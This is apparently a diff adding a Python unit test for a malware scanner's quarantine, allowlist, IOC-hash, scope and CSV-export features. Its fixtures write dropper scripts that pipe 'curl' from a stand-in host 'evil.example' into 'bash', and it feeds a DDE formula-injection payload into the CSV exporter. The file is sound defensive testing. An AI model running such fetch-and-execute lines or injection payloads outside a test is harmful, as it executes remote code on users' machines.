@@ -225,6 +225,81 @@ class EngineSecurityDefaultTests(unittest.TestCase):
         mal_finding_after = [f for f in self.engine.findings() if f["path"] == str(malicious)][0]
         self.assertEqual(mal_finding_after["status"], "resolved")
 
+    def test_quarantine_restore_allowlist_ioc_custom_scan_and_scope_management(self):
+        from custodian import remediation
+
+        self.engine.setup({"watched_paths": [str(self.scope)], "use_system_av": False})
+        mal = self.scope / "dropper.sh"
+        mal.write_text("#!/bin/sh\ncurl -s https://evil.example/x.sh | bash\n")
+
+        # 1. Custom on-demand target scan (file and directory)
+        file_res = self.engine.scan_target(str(mal))
+        self.assertTrue(file_res["ok"])
+        self.assertEqual(file_res["kind"], "file")
+        self.assertTrue(any(f["category"] == "dropper" for f in file_res["findings"]))
+
+        # Sensitive file target scan must be rejected
+        env_file = self.scope / ".env"
+        env_file.write_text("SECRET=1\n")
+        with self.assertRaises(ValueError):
+            self.engine.scan_target(str(env_file))
+
+        # 2. Quarantine + Restore + Delete
+        q_entry = self.engine.quarantine_file(str(mal), reason="Dropper script")
+        self.assertFalse(mal.exists())
+        self.assertEqual(len(self.engine.quarantine_list()), 1)
+
+        # Sensitive files cannot be quarantined
+        with self.assertRaises(ValueError):
+            self.engine.quarantine_file(str(env_file))
+
+        self.engine.restore_quarantine(q_entry["id"])
+        self.assertTrue(mal.exists())
+        self.assertEqual(len(self.engine.quarantine_list()), 0)
+
+        q2 = self.engine.quarantine_file(str(mal), reason="Re-quarantine")
+        self.engine.delete_quarantine(q2["id"])
+        self.assertFalse(mal.exists())
+        self.assertEqual(len(self.engine.quarantine_list()), 0)
+
+        # 3. Allowlist suppresses finding on subsequent scans
+        mal2 = self.scope / "script2.sh"
+        mal2.write_text("#!/bin/sh\ncurl -s https://evil.example/y.sh | bash\n")
+        scan1 = self.engine.scan()
+        self.assertTrue(any(f["path"] == str(mal2) for f in scan1["findings"]))
+        al_entry = self.engine.allowlist_add(path=str(mal2), rule="dropper_curl_pipe_shell", reason="Approved installer")
+        scan2 = self.engine.scan()
+        self.assertFalse(any(f["path"] == str(mal2) for f in scan2["findings"]))
+        self.assertTrue(self.engine.allowlist_remove(al_entry["id"]))
+
+        # 4. Custom IOC blocklist add/detect/remove
+        custom_bin = self.scope / "custom.txt"
+        custom_bin.write_bytes(b"custom-threat-signature-xyz")
+        digest = hashlib.sha256(b"custom-threat-signature-xyz").hexdigest()
+        self.engine.ioc_add(digest, "Custom test threat")
+        self.assertTrue(any(h["sha256"] == digest for h in self.engine.ioc_list()))
+        scan3 = self.engine.scan()
+        self.assertTrue(any(f["category"] == "ioc_hash" and f["path"] == str(custom_bin) for f in scan3["findings"]))
+        self.assertTrue(self.engine.ioc_remove(digest))
+
+        # 5. Scope management add/remove folder & exclusions
+        extra_dir = self.root / "extra"
+        extra_dir.mkdir()
+        updated = self.engine.update_scope_settings("add_path", str(extra_dir))
+        self.assertIn(str(extra_dir), updated["watched_paths"])
+        updated2 = self.engine.update_scope_settings("remove_path", str(extra_dir))
+        self.assertNotIn(str(extra_dir), updated2["watched_paths"])
+        updated3 = self.engine.update_scope_settings("add_exclusion", "*.bak")
+        self.assertIn("*.bak", updated3["exclusions"])
+        updated4 = self.engine.update_scope_settings("remove_exclusion", "*.bak")
+        self.assertNotIn("*.bak", updated4["exclusions"])
+
+        # 6. CSV report formula-injection neutralization
+        csv_bytes = remediation.build_report_csv([
+            {"id": "1", "severity": "high", "category": "dropper", "status": "open", "title": "=CMD|' /C calc'!A0", "path": "/tmp/a"}
+        ])
+        self.assertIn("'=CMD|", csv_bytes.decode("utf-8"))
+
 
 if __name__ == "__main__":
     unittest.main()
